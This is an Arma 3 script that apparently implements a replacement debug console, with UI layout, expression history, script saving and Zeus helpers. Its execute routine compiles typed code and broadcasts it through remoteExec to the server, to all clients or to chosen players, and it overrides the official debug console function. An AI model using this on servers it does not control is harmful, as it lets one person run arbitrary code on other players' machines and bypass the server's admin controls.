                                EDC_ButtonExecuteServer ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\displays\display3den\statusbar\server_ca.paa''></img> SERVER EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteAll ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_global_ca.paa''></img> GLOBAL EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteLocal ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_local_ca.paa''></img> LOCAL EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteTarget ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\Map\Diary\Icons\playerVirtual_ca.paa''></img> TARGET EXEC<t font=''EtelkaMonospacePro''>:<t/>", 1.05 * EDC_textSize];

                                EDC_ButtonExecuteServer ctrlCommit 0;
                                EDC_ButtonExecuteAll ctrlCommit 0;
                                EDC_ButtonExecuteLocal ctrlCommit 0;
                                EDC_ButtonExecuteTarget ctrlCommit 0;

                                EDC_ButtonExecuteTarget ctrlEnable true;
                            };

                            ctrlSetFocus _expressionCtrl;
                        };
                    };
                    true
                };
            }];
            _ButtonPreviousExpression ctrlCommit 0;

            _ButtonNextExpression = _display ctrlCreate[''RscButtonMenu'', 14044, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _ButtonPreviousExpression) select 0) + 0.5935,
                ((ctrlPosition _ButtonPreviousExpression) select 1),
                ((ctrlPosition _ButtonPreviousExpression) select 2),
                ((ctrlPosition _ButtonPreviousExpression) select 3)
            ];
            _ButtonNextExpression ctrlSetBackgroundColor[0.1, 0.1, 0.1, 1];
            _ButtonNextExpression ctrlSetPosition _ctrlPos;
            _ButtonNextExpression ctrlSetStructuredText parseText format["<t font=''puristaSemiBold'' align=''center'' shadow=''0'' color=''#FFFFFF'' size=''%1''>ü<t/>", 0.93 * EDC_textSize];
            _ButtonNextExpression ctrlSetTooltip ''NEXT STATEMENT'';
            _ButtonNextExpression ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                _parentDisplay = ctrlParent _control;
                _key = 201;
                EDC_DIK_NEXT = 209;
                comment "PG DN";
                EDC_DIK_PRIOR = 201;
                comment "PG UP";

                if (_key in [EDC_DIK_PRIOR, EDC_DIK_NEXT]) then {
                    _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                    _expressionResultHistory = parsingNamespace getVariable "BIS_RscDebugConsoleExpressionResultHistory";

                    _last = count _expressionHistory - 1;

                    _index = 0 max((_parentDisplay getVariable "RscDebugConsole_expressionHistory_index") + ([1, -1] select(_key == EDC_DIK_NEXT))) min _last;
                    _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", _index];

                    _expressionCtrl = uinamespace getVariable ''EDC_expression'';
                    _expressionCtrl ctrlSetText(_expressionHistory select _index);

                    if (ctrlEnabled _expressionCtrl) then {
                        comment "// --- Save last result";

                        _lastResult = ctrlText(uinamespace getVariable ''EDC_expressionOutput'');
                        _expressionResultHistory set[0, _lastResult];
                        if (_lastResult isEqualTo "") then {
                            _expressionResultHistory set[1, [0, 0, 0, 0]]
                        };
                    };

                    if (false) then {
                        if (_index < _last) then {
                            _expressionCtrl ctrlEnable false;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlEnable false;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlSetText "";

                            (uinamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor[0, 0, 0, 0];
                            _parentDisplay getVariable "RscDebugConsole_state"
                            params["_stateServer", "_stateGlobal", "_stateLocal"];

                            _stateServer select 0 ctrlSetText "";
                            _stateGlobal select 0 ctrlSetText "";

                            if (isMultiplayer) then {
                                _stateServer select 0 ctrlenable false;
                                _stateGlobal select 0 ctrlenable false;
                            };

                            (uinamespace getVariable ''EDC_ButtonExecuteTarget'') ctrlEnable false;
                            (uinamespace getVariable ''EDC_ButtonExecuteTarget'') ctrlSetText "";

                            _stateLocal select 0 ctrlSetText format["%1 %2", "SELECT", (count _expressionHistory) - 1 - _index];
                            ctrlSetFocus(_stateLocal select 0);
                        }
                        else {
                            _expressionCtrl ctrlEnable true;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlEnable true;
                            (uinamespace getVariable ''EDC_expressionOutput'') ctrlSetText(_expressionResultHistory select 0);
                            (uinamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor(_expressionResultHistory select 1);

                            {
                                _x select 0 ctrlSetText(_x select 1);
                                if (isMultiplayer) then {
                                    _x select 0 ctrlEnable true
                                };
                            }
                            forEach(_parentDisplay getVariable "RscDebugConsole_state");

                            with uinamespace do {
                                EDC_ButtonExecuteServer ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\a3\3den\data\displays\display3den\statusbar\server_ca.paa''></img> SERVER EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteAll ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_global_ca.paa''></img> GLOBAL EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteLocal ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\3den\data\Displays\Display3den\toolbar\widget_local_ca.paa''></img> LOCAL EXEC<t/>", 1.05 * EDC_textSize];
                                EDC_ButtonExecuteTarget ctrlSetStructuredText parseText format["<t align=''left'' font=''puristaMedium'' shadow=''0'' color=''#FFFFFF'' size=''%1''><img image=''\A3\ui_f\data\Map\Diary\Icons\playerVirtual_ca.paa''></img> TARGET EXEC<t font=''EtelkaMonospacePro''>:<t/>", 1.05 * EDC_textSize];

                                EDC_ButtonExecuteServer ctrlCommit 0;
                                EDC_ButtonExecuteAll ctrlCommit 0;
                                EDC_ButtonExecuteLocal ctrlCommit 0;
                                EDC_ButtonExecuteTarget ctrlCommit 0;

                                EDC_ButtonExecuteTarget ctrlEnable true;
                            };

                            ctrlSetFocus _expressionCtrl;
                        };
                    };
                    true
                };
            }];
            _ButtonNextExpression ctrlCommit 0;


            _ctrlPos = ctrlPosition _ExpressionOutput;
            _width = (ctrlPosition _ButtonNextExpression)# 2;
            _ctrlPos set[0, (_ctrlPos# 0) + _width];
            _ctrlPos set[2, (_ctrlPos# 2) - (_width * 2)];
            _ExpressionOutput ctrlSetPosition _ctrlPos;
            _ExpressionOutput ctrlCommit 0;

            _TargetListText = _display ctrlCreate[''RscStructuredText'', 14045, _ctrlGroupParent];
            _ctrlPos = [
                ((ctrlPosition _PerfMetText) select 0),
                ((ctrlPosition _ExpressionText) select 1) - 0.003,
                ((ctrlPosition _PerfMetText) select 2),
                ((ctrlPosition _PerfMetText) select 3)
            ];
            _TargetListText ctrlSetBackgroundColor[0, 0, 0, 0];
            _TargetListText ctrlSetPosition _ctrlPos;
            _TargetListText ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''1'' color=''#FFFFFF'' size=''%1''>Select:<t/>", 0.84 * EDC_textSize];
            _TargetListText ctrlCommit 0;

            comment "0 593 - 588 005";
            comment "2 599 - 588 011";
            _xAdj = 0.005;
            _wAdj = 0.011;

            _ctrlPos1 = ctrlPosition _ButtonWatch1;
            _ctrlPos1 set[0, (_ctrlPos1# 0) + _xAdj];
            _ctrlPos1 set[2, (_ctrlPos1# 2) - _wAdj];

            _ctrlPos2 = ctrlPosition _ButtonWatch2;
            _ctrlPos2 set[0, (_ctrlPos2# 0) + _xAdj];
            _ctrlPos2 set[2, (_ctrlPos2# 2) - _wAdj];

            _ctrlPos3 = ctrlPosition _ButtonWatch3;
            _ctrlPos3 set[0, (_ctrlPos3# 0) + _xAdj];
            _ctrlPos3 set[2, (_ctrlPos3# 2) - _wAdj];

            _ctrlPos4 = ctrlPosition _ButtonWatch4;
            _ctrlPos4 set[0, (_ctrlPos4# 0) + _xAdj];
            _ctrlPos4 set[2, (_ctrlPos4# 2) - _wAdj];

            _ButtonWatch1 ctrlSetPosition _ctrlPos1;
            _ButtonWatch1 ctrlCommit 0;

            _ButtonWatch2 ctrlSetPosition _ctrlPos2;
            _ButtonWatch2 ctrlCommit 0;

            _ButtonWatch3 ctrlSetPosition _ctrlPos3;
            _ButtonWatch3 ctrlCommit 0;

            _ButtonWatch4 ctrlSetPosition _ctrlPos4;
            _ButtonWatch4 ctrlCommit 0;


            comment "//--- Set focus to expression field";
            private _expressionSaved = profileNamespace getVariable["RscDebugConsole_expression", ""];

            EDC_expression ctrlSetText _expressionSaved;
            ctrlSetFocus EDC_expression;

            _expressionHistory = profileNamespace getVariable["RscDebugConsole_expressionHistory", []];

            if (_expressionHistory isEqualTo[]) then {
                profileNamespace setvariable["RscDebugConsole_expressionHistory", [_expressionSaved]];
                _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
            };
            _display setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];

        };
    };
    edc_fnc_addunittozeusinterface = {
        _unit = _this; {
            [_x, [
                [_unit], true
            ]] remoteExec[''addCuratorEditableObjects'', 0, _unit];
        }
        forEach allCurators;
    };
    edc_fnc_initvars = {
        EDC_versionStr = format[''V2.0.9''];
        uiNamespace setVariable[''EDC_versionStr'', EDC_versionStr];
        EDC_textSize = safeZoneH * 0.5;
        uiNamespace setVariable[''EDC_textSize'', EDC_textSize];
        EDC_defaultColor = [(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
        uiNamespace setVariable[''EDC_defaultColor'', EDC_defaultColor];
        EDC_UTILITIES_KEYWORD = ''utils'';
        EDC_EXPRESSION_HISTORY_MAX = 10;
        if (isNil ''EDC_showWatch1'') then {
            EDC_showWatch1 = false
        };
        if (isNil ''EDC_showWatch2'') then {
            EDC_showWatch2 = false
        };
        if (isNil ''EDC_showWatch3'') then {
            EDC_showWatch3 = false
        };
        if (isNil ''EDC_showWatch4'') then {
            EDC_showWatch4 = false
        };
    };
    edc_fnc_timestr = {
        params[[''_unit1'', objNull], [''_unit2'', objNull]];
        comment "copy unit 1''s loadout onto unit 2";
        if ((isNull _unit1) || (isNull _unit2)) exitWith {};
        if ((!(_unit1 isKindOf ''Man'')) || (!(_unit2 isKindOf ''Man''))) exitWith {};
        private _loadout = getUnitLoadout _unit1;
        private _REtarget =
        if (isPlayer _unit2) then {
            _unit2
        } else {
            owner _unit2
        };
        [_unit2, _loadout] remoteExec[''setUnitLoadout'', _REtarget];
    };
    edc_fnc_timestr = {
        private _string = _this;
        private _sArray = _string splitString '':'';
        private _newString = '''';
        private _count = count _sArray;
        private _lastIndex = _count - 1; {
            if (_forEachIndex == _lastIndex) then {
                _newString = _newString + _x;
            } else {
                _newString = _newString + _x + " : ";
            };
        }
        forEach _sArray;
        _newString;
    };
    edc_fnc_limitchars = {
        params[[''_inputString'', ''''], [''_charLimit'', -1]];
        if ((_inputString == '''') || (_charLimit == -1)) exitWith {
            _inputString
        };
        private _charArray = _inputString splitString '''';
        private _charCount = count _charArray;
        if (_charCount <= _charLimit) exitWith {
            _inputString
        };
        private _outputString = '''';
        for ''_i''
        from 0 to(_charLimit - 4) do {
            _outputString = _outputString + (_charArray# _i);
        };
        _outputString = _outputString + ''...'';
        _outputString;
    };
    edc_fnc_showchat = {
        private _showChat = [] spawn {
            with uiNamespace do {
                uiSleep 0.001;
                showChat true;
            };
            with missionNamespace do {
                sleep 0.001;
                showChat true;
            };
        };
    };
    edc_fnc_updateserverfps = {
        with uinamespace do {
            EDC_PerfMetServerFPS ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Server FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetServerFPS ctrlCommit 0;
        };
        [
            [], {
                _this call(EDC_REfnc# 1);
            }
        ]
        remoteExec[''spawn'', 2];
    };
    edc_fnc_spawndebugconsole = {
        waitUntil {
            !isNull finddisplay 49
        };

        JAM_isCBALoaded = false;

        {

            _modFolder = _x# 1;
            if (_modFolder == "@CBA_A3") exitWith {
                JAM_isCBALoaded = true;
            };
        }
        forEach getLoadedModsInfo;

        if (true) then {
            missionnamespace setVariable[''useBigConsole'', false];
        };

            [] call EDC_fnc_editDebugConsole;

    };
    edc_fnc_showexternalwatchresults = {
        waitUntil {
            isNull(findDisplay 49)
        };
        if (isNil ''EDC_showWatch1'') then {
            EDC_showWatch1 = false
        };
        if (isNil ''EDC_showWatch2'') then {
            EDC_showWatch2 = false
        };
        if (isNil ''EDC_showWatch3'') then {
            EDC_showWatch3 = false
        };
        if (isNil ''EDC_showWatch4'') then {
            EDC_showWatch4 = false
        };
        if ((EDC_showWatch1) or(EDC_showWatch2) or(EDC_showWatch3) or(EDC_showWatch4)) then {
            hintSilent '''';
            [] spawn EDC_fnc_initWatchResultLoop;
            hintSilent '''';
        };
    };
    edc_fnc_consoleexec = {
        params[[''_buttonType'', '''']];
        if (_buttonType == '''') exitWith {
            if (!isGamePaused) then {
                playSound[''addItemFailed'', true]
            }
        };
        if ((ctrlText(uiNamespace getVariable ''EDC_expression'')) == '''') exitWith {
            if (!isGamePaused) then {
                playSound[''addItemFailed'', true]
            }
        };
        _expressionResultHistory = parsingNamespace getVariable "BIS_RscDebugConsoleExpressionResultHistory";
        _expressionResultHistory set [0, ""];
        (uiNamespace getVariable ''EDC_expressionOutput'') ctrlSetText "";

        call EDC_fnc_saveExpression;

        private _expressionCtrl = uiNamespace getVariable ''EDC_expression'';

        private _input = ctrlText _expressionCtrl;

        comment "//--- Utilities keyword: utils or utils <number>";
        private _args = "";
        private _len = count EDC_UTILITIES_KEYWORD;
        if (
            _input select[0, _len] == EDC_UTILITIES_KEYWORD &&
            {
                _args = _input select[_len] splitString " "
                joinString "";
                _args isEqualTo "" || {
                    "0123456789"
                    find(_args select[0, 1]) > -1
                }
            }
        )
            exitWith {
                parseNumber _args execVM "\A3\Functions_F\Debug\Utilities\lib\index.sqf"
            };

        comment "/* remove // comments START */";

        private _codeText = [_input] call EDC_fnc_commentCompatability;

        comment "/* remove // comments END */";

        private _fnc_setSaveColor = {
            (uiNamespace getVariable ''EDC_expressionOutputBackground'') ctrlSetBackgroundColor _this;
            _expressionResultHistory = parsingNamespace getVariable "BIS_RscDebugConsoleExpressionResultHistory";
            _expressionResultHistory set [1, _this];
        };

        [0, 0, 0, 0.25] call _fnc_setSaveColor;

        switch _buttonType do {
            case ''target'':{
                    private _remoteExecTargets =
                    switch ((uiNameSpace getVariable ''EDC_ComboSelectTargetType'') lbText(lbCurSel(uiNameSpace getVariable ''EDC_ComboSelectTargetType''))) do {
                        case ''Selected Unit'':{
                                switch (missionnamespace getVariable[''EDC_listWhat'', ''players'']) do {
                                    case ''players'':{
                                            private _targetUID = (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbData(lbCurSel(uiNameSpace getVariable ''EDC_ctrl_targetLB''));
                                            private _return = []; {
                                                if (getPlayerUID _x == _targetUID) exitWith {
                                                    _return pushBackUnique _x;
                                                };
                                            }
                                            forEach allPlayers;
                                            _return
                                        };
                                    case ''ai'':{
                                            private _targetID = (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbValue(lbCurSel(uiNameSpace getVariable ''EDC_ctrl_targetLB''));
                                            private _return = [];
                                            private _agents = []; {
                                                if (isAgent(teamMember _x)) then {
                                                    _agents pushBack _x;
                                                };
                                            }
                                            forEach entities ''man''; {
                                                if (_x getVariable[''EDC_listIndex'', -1] == _targetID) exitWith {
                                                    _return pushBackUnique _x;
                                                };
                                            }
                                            forEach((allUnits - allPlayers) + _agents);
                                            _return
                                        };
                                };
                            };
                        case ''cursorObject'':{
                                [cursorObject]
                            };
                        case ''cursorTarget'':{
                                [cursorTarget]
                            };
                        case ''curatorSelected'':{
                                private _curatorSelected = curatorSelected;
                                private _Objects = _curatorSelected# 0;
                                private _Groups = _curatorSelected# 1;
                                private _Waypoints = _curatorSelected# 2;
                                private _Markers = _curatorSelected# 3;
                                private _return = _Objects;
                                _return
                            };
                    };
                    if (_remoteExecTargets isEqualTo[]) then {
                        if (!isGamePaused) then {
                            playsound["addItemFailed", true];
                        };
                    } else {
                        [0, 1, 1, 0.25] call _fnc_setSaveColor;


                        private _targetExecCode = compile _codeText;
                        EDC_targetExecCodeRE = ['''', _targetExecCode];
                        publicVariable ''EDC_targetExecCodeRE'';



                        {
                            if !(isNull _x) then {
                                private _target = _x;
                                private _targetRE =
                                    if (isPlayer _target) then {
                                        _target
                                    } else {
                                        owner _target
                                    };

                                    [
                                        [_target], {
                                            _this call(EDC_REfnc# 9);
                                        }
                                    ] remoteExec["call", _targetRE];
                            };
                        }
                        forEach _remoteExecTargets;
                        if (!isGamePaused) then {
                            playsound["addItemOK", true];
                        };
                    };
                };
            case ''local'':{
                    [0, 0, 1, 0.25] call _fnc_setSaveColor;

                    if (!isGamePaused) then {
                        playsound["addItemOK", true];
                    };
                    private _code = compile _codeText;
                    private _return = ([nil] apply {
                            [] call _code
                        }
                        param[0, text ""]);
                    private _returnStr = str _return;
                    (uiNamespace getVariable ''EDC_expressionOutput'') ctrlSetText _returnStr;
                    (uiNamespace getVariable ''EDC_expressionOutput'') ctrlCommit 0;
                };
            case ''global'':{
                    [1, 0, 0, 0.25] call _fnc_setSaveColor;

                    if (!isGamePaused) then {
                        playsound["addItemOK", true];
                    };

                    private _globalExecCode = compile _codeText;
                    EDC_globalExecCodeRE = ['''', _globalExecCode];
                    publicVariable ''EDC_globalExecCodeRE'';

                    [
                        [], {
                            [] call(EDC_REfnc# 11);
                        }
                    ] remoteExec["call"];
                };
            case ''server'':{
                    [0, 1, 0, 0.25] call _fnc_setSaveColor;

                    if (!isGamePaused) then {
                        playsound["addItemOK", true];
                    };

                    private _serverExecCode = compile _codeText;
                    EDC_serverExecCodeRE = ['''', _serverExecCode];
                    publicVariable ''EDC_serverExecCodeRE'';

                    [
                        [], {
                            [] call(EDC_REfnc# 12);
                        }
                    ] remoteExec["call", 2];


                };
        };
    };
    edc_fnc_savescript = {
        params[[''_script'', '''']];
        if (isNull(findDisplay 49)) exitWith {
            if (!isGamePaused) then {
                playSound[''addItemFailed'', true]
            }
        };
        with uiNamespace do {
            disableSerialization;

            EDC_display_saveScriptOptions = (findDisplay 49) createDisplay "RscDisplayEmpty";
            showChat true;
            _txtSize = safeZoneH * 0.5;

            _ctrl_title = EDC_display_saveScriptOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_title ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.236 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.022 * safezoneH];
            _ctrl_title ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
            _ctrl_title ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Save Script</t>");
            _ctrl_title ctrlCommit 0;

            _ctrl_background = EDC_display_saveScriptOptions ctrlCreate["RscText", -1];
            _ctrl_background ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.269 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.44 * safezoneH];
            _ctrl_background ctrlSetBackgroundColor[0, 0, 0, 0.6];
            _ctrl_background ctrlCommit 0;

            _ctrl_titleSaveAs = EDC_display_saveScriptOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_titleSaveAs ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
            _ctrl_titleSaveAs ctrlSetBackgroundColor[0, 0, 0, 0];
            _ctrl_titleSaveAs ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Save As</t>");
            _ctrl_titleSaveAs ctrlCommit 0;

            _ctrl_titlePreview = EDC_display_saveScriptOptions ctrlCreate["RscStructuredText", -1];
            _ctrl_titlePreview ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.346 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
            _ctrl_titlePreview ctrlSetBackgroundColor[0, 0, 0, 0];
            _ctrl_titlePreview ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Preview</t>");
            _ctrl_titlePreview ctrlCommit 0;

            EDC_saveScriptOptions_ctrl_SaveAs = EDC_display_saveScriptOptions ctrlCreate["RscEdit", -1];
            EDC_saveScriptOptions_ctrl_SaveAs ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.302 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.033 * safezoneH];
            EDC_saveScriptOptions_ctrl_SaveAs ctrlSetBackgroundColor[0, 0, 0, 0.5];
            _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []];
            _savedScriptsCount = count _savedScripts;
            _saveAsTextUnique = format[''New Script %1'', _savedScriptsCount + 1];
            EDC_saveScriptOptions_ctrl_SaveAs ctrlSetText _saveAsTextUnique;
            EDC_saveScriptOptions_ctrl_SaveAs ctrlCommit 0;

            EDC_saveScriptOptions_ctrl_Preview = EDC_display_saveScriptOptions ctrlCreate["RscEditMulti", -1];
            EDC_saveScriptOptions_ctrl_Preview ctrlSetPosition[0.31953 * safezoneW + safezoneX, 0.368 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.33 * safezoneH];
            EDC_saveScriptOptions_ctrl_Preview ctrlSetBackgroundColor[0, 0, 0, 0.5];
            EDC_saveScriptOptions_ctrl_Preview ctrlSetText _script;
            EDC_saveScriptOptions_ctrl_Preview ctrlCommit 0;

            _buttonCancel = EDC_display_saveScriptOptions ctrlCreate["RscButtonMenu", -1];
            _buttonCancel ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
            _buttonCancel ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>CANCEL</t>");
            _buttonCancel ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                with uiNamespace do {
                    disableSerialization;
                    _parentDisplay = ctrlParent _control;
                    _parentDisplay closeDisplay 2;
                };
            }];
            _buttonCancel ctrlCommit 0;

            _buttonSave = EDC_display_saveScriptOptions ctrlCreate["RscButtonMenu", -1];
            _buttonSave ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
            _buttonSave ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>SAVE</t>");
            _buttonSave ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                with uiNamespace do {
                    disableSerialization;
                    _parentDisplay = ctrlParent _control;
                    _script = ctrlText EDC_saveScriptOptions_ctrl_Preview;
                    _scriptName = ctrlText EDC_saveScriptOptions_ctrl_SaveAs;
                    if ((_scriptName == '''') or(_script == '''')) exitWith {
                        showChat true;
                        systemChat ''Error : Script name or expression is blank.'';
                        if (!isGamePaused) then {
                            playSound[''additemfailed'', true];
                        };
                    };
                    _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []];
                    _scriptFound = false; {
                        if (_x select 0 == _scriptName) exitWith {
                            _scriptFound = true;
                        };
                    }
                    forEach _savedScripts;
                    if (_scriptFound) exitWith {
                        showChat true;
                        systemChat ''Error : There is already a script with that name.'';
                        if (!isGamePaused) then {
                            playSound[''additemfailed'', true];
                        };
                    };
                    _scriptElement = [_scriptName, _script];
                    _savedScripts pushBackUnique _scriptElement;
                    profileNamespace setVariable[''EDC_savedScripts'', _savedScripts];
                    saveProfileNamespace;
                    _parentDisplay closeDisplay 2;
                    systemChat format[''Script %1 saved to profile'', _scriptName];
                    if (!isGamePaused) then {
                        playSound[''addItemOk'', true];
                    };
                };
            }];
            _buttonSave ctrlCommit 0;
        };
    };
    edc_fnc_editdebugconsole_old = {
        JAM_remoteExec = true;
        BIS_fnc_enableDebugConsole = {
            if (!isNil ''JAM_showOfficialDebugConsole_49'') then {
                JAM_showOfficialDebugConsole_49 = false;
                with UInamespace do {
                    (findDisplay 49) closeDisplay 0;
                };
            };
            EDC_fnc_initMain = {
                comment ''king ring dingaling'';

                EDC_versionNum = ''2.03'';
                EDC_versionType = ''A'';
                EDC_versionStr = format[''V%1%2'', EDC_versionNum, EDC_versionType];

                comment ''----------------------------------------------------------------------------------'';

                JAM_fnc_EGSpectator = {
                    if (["IsInitialized"] call BIS_fnc_EGSpectator) exitWith {
                        ["Terminate"] call BIS_fnc_EGSpectator;
                        ctrlParent(_this select 0) closeDisplay 2;
                    };

                    ["Initialize", [player, nil, true, true, true, true, true, true, true, true]] spawn BIS_fnc_EGSpectator;
                };

                JAM_fnc_help = {
                    comment "functions viewer";
                    comment "[ctrlParent (_this select 0)] spawn (uiNamespace getVariable ''BIS_fnc_help'')";
                    [(findDisplay 49)] spawn(uiNamespace getVariable ''BIS_fnc_help'');
                };

                JAM_fnc_animViewer = {
                    [] spawn(uiNamespace getVariable "BIS_fnc_animViewer");
                };

                JAM_fnc_camera = {
                    [''Exit''] call BIS_fnc_camera;
                    (findDisplay 314) closeDisplay 0;
                    [''Terminate''] call BIS_fnc_EGSpectator;
                    (findDisplay 60492) closeDisplay 0;
                    [] spawn(uiNamespace getVariable "BIS_fnc_camera");
                };

                JAM_fnc_configViewer = {
                    [(findDisplay 49)] spawn(uiNamespace getVariable ''BIS_fnc_configViewer'');
                };

                JAM_fnc_GUIeditor = {
                    [] spawn BIS_fnc_guiEditor;
                    comment "ctrlParent (_this select 0) closeDisplay 2}";
                    (findDisplay 49) closeDisplay 2;
                };

                JAM_fnc_removeCommentsA = {
                    _input = _this select 0;

                    private _strings = [];
                    private _start = -1;

                    while {
                        _start = _input find "//";
                        _start > -1
                    }
                    do {
                        _input select[0, _start] call {
                            private _badQuotes = _this call {
                                private _qtsGood = [];
                                private _qtsInfo = [];
                                private _arr = toArray _this;

                                {
                                    _qtsGood pushBack((count _arr - count(_arr - [_x])) % 2 == 0);
                                    _qtsInfo pushBack[_this find toString[_x], _x];
                                }
                                forEach[34, 39];

                                if (_qtsGood isEqualTo[true, true]) exitWith {
                                    0
                                };

                                _qtsInfo sort true;
                                _qtsInfo select 0 select 1
                            };

                            if (_badQuotes > 0) exitWith {
                                _last = _input select[_start] find toString[_badQuotes];

                                if (_last < 0) exitWith {
                                    _strings = [_input];
                                    _input = "";
                                };

                                _last = _start + _last + 1;
                                _strings pushBack(_input select[0, _last]);

                                _input = _input select[_last];
                            };

                            _strings pushBack _this;

                            _input = _input select[_start];

                            private _end = _input find toString[10];

                            if (_end < 0) exitWith {
                                _input = ""
                            };

                            _input = _input select[_end + 1];
                        };
                    };

                    _input = (_strings joinString "") + _input;
                    _input
                };

                EDC_fnc_listPlayers = {
                    _allPlayers = allPlayers;
                    _allPlayers2 = [] call bis_fnc_listPlayers; {
                        _allPlayers pushBackUnique _x;
                    }
                    forEach _allPlayers2;
                    _allZeuses = []; {
                        _zeus = getAssignedCuratorUnit _x;
                        if (!isNull _zeus) then {
                            if !(_zeus in _allPlayers) then {
                                _allPlayers pushBackUnique _zeus;
                                _allZeuses pushBackUnique _zeus;
                            };
                        };
                    }
                    forEach allCurators;
                    _allPlayers;
                };

                EDC_fnc_listZeuses = {
                    _allPlayers = [] call bis_fnc_listPlayers;
                    _allZeuses = []; {
                        _zeus = getAssignedCuratorUnit _x;
                        if (!isNull _zeus) then {
                            if !(_zeus in _allPlayers) then {
                                _allPlayers pushBackUnique _zeus;
                                _allZeuses pushBackUnique _zeus;
                            };
                        };
                    }
                    forEach allCurators;
                    _allZeuses;
                };

                EDC_fnc_listAllZeuses = {
                    _allZeuses = []; {
                        _zeus = getAssignedCuratorUnit _x;
                        if (!isNull _zeus) then {
                            _allZeuses pushBackUnique _zeus;
                        };
                    }
                    forEach allCurators;
                    _allZeuses;
                };

                EDC_fnc_listUnits = {
                    _allUnits = allPlayers; {
                        if (_x isKindOf ''man'') then {
                            _allUnits pushBackUnique _x;
                        };
                    }
                    forEach allUnits;
                    _allZeuses = []; {
                        _zeus = getAssignedCuratorUnit _x;
                        if (!isNull _zeus) then {
                            if !(_zeus in _allUnits) then {
                                _allUnits pushBackUnique _zeus;
                                _allZeuses pushBackUnique _zeus;
                            };
                        };
                    }
                    forEach allCurators; {
                        if (_x iskindof ''man'') then {
                            _allUnits pushBackUnique _x;
                        };
                    }
                    forEach allDeadMen;
                    _allUnits;
                };

                EDC_fnc_listAI = {
